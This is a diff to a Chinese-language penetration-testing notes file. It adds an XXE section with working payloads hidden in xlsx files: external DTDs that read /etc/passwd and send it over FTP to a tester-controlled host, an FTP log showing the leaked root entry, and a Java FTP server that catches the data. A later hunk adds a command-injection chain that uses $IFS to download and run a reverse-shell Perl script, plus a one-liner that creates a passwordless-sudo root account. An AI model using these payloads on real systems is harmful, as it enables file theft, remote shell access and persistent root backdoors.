@@ -154,6 +154,141 @@ if(token != null && token.equals(req_token)) {
 1. 请求非http协议, 读取本地文件, 如: `file:///etc/passwd`。
 1. 间接获取内置帐号token。
 
+
+## XXE(XML External Entity attack)
+
+!!! note "DTD: Document Type Definition, XML文件的模板, 定义XML文件中的元素, 元素的属性, 元素的排列方式, 元素包含的内容等"
+
+### 验证步骤
+
+1. 是否存在 **XML解析**
+    - 存在Office2007及以上版本文件导入功能
+    - SOAP接口, 如Apache CXF或axis实现的WebService接口
+
+1. 是否存在漏洞
+    - 检查poi-x.x.jar是否为3.10.1之前的版本
+
+1. 本地启动 **http服务**: `python -m http.server 8888 --bind 192.168.1.1`
+1. 使用WinRAR打开xlsx文件, 编辑[Content_Types].xml
+    1. 是否支持解析内部实体(未报错)
+
+        > 实体: 定义引用普通文本或特殊字符的快捷方式的变量
+
+        ```xml hl_lines="3 5"
+        <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+        <!DOCTYPE root [
+            <!ENTITY test "testString">
+        ]>
+        <root>&test;</root>
+        ```
+
+    1. 是否支持解析外部实体
+
+        ```xml hl_lines="3"
+        <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+        <!DOCTYPE root [
+        	<!ELEMENT test SYSTEM "http://192.168.1.1/test.dtd">
+        ]>
+        <root>&test;</root>
+        ```
+
+1. 导入xlsx文件后, 接收到 **http请求**
+1. 另一种POC
+
+    ```xml
+    <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+    <!DOCTYPE root [
+    	<!ENTITY % q SYSTEM "http://10.21.151.32:8888/test.dtd">
+    	%q;
+    ]>
+    <root></root>
+    ```
+
+1. http服务存放dtd文件
+
+    ```dtd
+    <!ENTITY % p1 SYSTEM "file:///etc/passwd">
+    <!ENTITY % p2 "<!ENTITY &#x25; e1 SYSTEM 'ftp://192.168.1.1:21/%p1;'>">
+    %p2;
+    %e1;
+    ```
+
+    或
+
+    ```xml
+    <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+    <!DOCTYPE root [
+    	<!ENTITY % q SYSTEM "http://10.21.151.32:8888/test.dtd">
+    	%q;
+    	%p;
+    ]>
+    <root>&exfil;</root>
+    ```
+
+    ```dtd
+    <!ENTITY % data SYSTEM "file:///etc/passwd">
+    <!ENTITY % p "<!ENTITY exfil SYSTEM 'ftp://10.21.151.32:21/%data;'>">
+    ```
+
+1. 使用IPOP开启 **ftp服务**, 导入xlsx文件, 接收到请求
+
+    ``` hl_lines="9"
+    ![2019/11/18 11:40:09] x.x.x.x:35914 connected
+    < x.x.x.x USER anonymous
+    > x.x.x.x 331 Password required for anonymous.
+    < x.x.x.x PASS Java1.8.0_201@
+    ! x.x.x.x User "anonymous" is authenticated
+    > x.x.x.x 230 User anonymous logged in.
+    < x.x.x.x TYPE I
+    > x.x.x.x 200 Type set to I.
+    < x.x.x.x CWD root:x:0:0:root:
+    > x.x.x.x 501 CWD failed. Invalid directory name syntax
+    < x.x.x.x QUIT
+    > x.x.x.x 221 Goodbye.
+    ![2019/11/18 11:40:09] x.x.x.x disconnected
+    ```
+
+1. 自定义FTPServer
+
+    ```java
+    import java.io.BufferedReader;
+    import java.io.IOException;
+    import java.io.InputStreamReader;
+    import java.io.PrintWriter;
+    import java.net.ServerSocket;
+    import java.net.Socket;
+
+    public class FtpServer {
+
+        public static void main(String args[]) throws IOException {
+            ServerSocket s = new ServerSocket(21);
+            Socket incoming = s.accept();
+            BufferedReader in = new BufferedReader(new InputStreamReader(incoming.getInputStream()));
+            PrintWriter out = new PrintWriter(incoming.getOutputStream(), true);
+            out.println("220 Ftp Server Running!");
+            System.out.println(in.readLine());
+            out.println("331 USER");
+            System.out.println(in.readLine());
+            out.println("230 Login In");
+            while (true) {
+                String str = in.readLine();
+                if (str != null && str.trim().toUpperCase().startsWith("QUIT")) {
+                    out.println("221 bye!");
+                    out.close();
+                    in.close();
+                    break;
+                } else if (str != null && str.trim().toUpperCase().startsWith("CWD")) {
+                    System.out.print("\n" + str.substring(3));
+                } else {
+                    System.out.print(str);
+                }
+    			out.println("200 OK!");
+            }
+        }
+    }
+    ```
+
+
 ## 反序列化
 
 ```php
@@ -378,6 +513,11 @@ public interface UserMapper {
 1. 如果对特殊字符校验无法 {==反弹shell==}, 可分拆两步
     1. 上传反弹shell脚本, 保存到指定路径: `xxx$(curl$IFS-o"/tmp/hhack.pl"$IFS"http://x.x.x.x:8888/hhack.pl")`
     1. 执行脚本: `xxx$(perl$IFS"/tmp/hhack.pl")`
+
+1. 找到可以提权到root的脚本, 创建帐号, 设置密码, 添加权限
+    ```sh
+    useradd xxx;echo password | passwd xxx --stdin &>/dev/null;echo "xxx ALL=(root) NOPASSWD: ALL" >> /etc/sudoers
+    ```
 
 ### 反弹shell
 
